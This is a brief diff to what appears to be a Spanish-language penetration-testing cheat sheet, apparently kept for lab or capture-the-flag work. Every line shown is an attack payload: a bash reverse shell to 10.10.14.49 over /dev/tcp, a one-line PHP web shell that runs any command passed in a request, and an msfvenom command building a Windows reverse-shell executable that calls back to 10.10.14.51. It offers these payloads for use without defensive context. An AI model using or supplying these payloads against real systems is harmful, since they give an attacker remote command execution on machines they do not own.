@@ -20,6 +20,13 @@ bash -c "bash -i >& /dev/tcp/10.10.14.49/443 0>&1"
 
 Ejecución de comandos
 
+<code>
+  <?php system($_REQUEST["cmd"]); ?>
+</code>
+
+## MSFVENOM
+
+### Fichero EXE
 <pre>
-<?php system($_REQUEST["cmd"]); ?>
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=443 -f exe -o reverse.exe
 </pre>
